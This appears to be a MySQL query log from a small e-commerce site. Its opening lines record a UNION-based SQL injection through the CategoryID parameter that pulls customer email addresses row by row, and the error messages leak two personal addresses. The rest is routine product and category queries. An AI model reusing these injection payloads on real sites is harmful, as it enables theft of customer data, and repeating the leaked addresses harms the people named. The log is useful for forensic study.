+[2021-02-12 20:32:53]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 7,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:53]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:53]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 7,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:53]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:53]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:53]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:53]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 7,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:53]	select CategoryID from _tbl_products where SubCategoryID=''~jeya@gmail.com'~'  and IsActive='1'
+[2021-02-12 20:32:53]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '~jeya@gmail.com'~'  and IsActive='1'' at line 1
+[2021-02-12 20:32:53]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:32:53]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 8,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:32:53]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:32:53]	select * from _tbl_products where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 8,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:32:53]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:32:53]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:32:53]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:32:53]	select * from _tbl_sub_category where CategoryID='999999.9' union all select (select concat(0x27,0x7e,unhex(Hex(cast(_tbl_customer.EmailID as char))),0x27,0x7e) from `klxmart_ecommerce`._tbl_customer Order by EmailID limit 8,1) ,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:32:53]	select CategoryID from _tbl_products where SubCategoryID=''~Jeyaraj_123@yahoo.com'~'  and IsActive='1'
+[2021-02-12 20:32:53]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '~Jeyaraj_123@yahoo.com'~'  and IsActive='1'' at line 1
+[2021-02-12 21:52:02]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 21:52:02]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 21:52:02]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 21:52:02]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 21:52:02]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:02]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:02]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:02]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 21:52:03]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 21:59:35]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 21:59:35]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 21:59:35]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 21:59:35]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 23:24:59]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 23:24:59]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 23:24:59]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 23:24:59]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 23:25:07]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 23:25:07]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 23:25:07]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 23:25:07]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 23:28:26]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 23:28:26]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 23:28:26]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 23:28:26]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
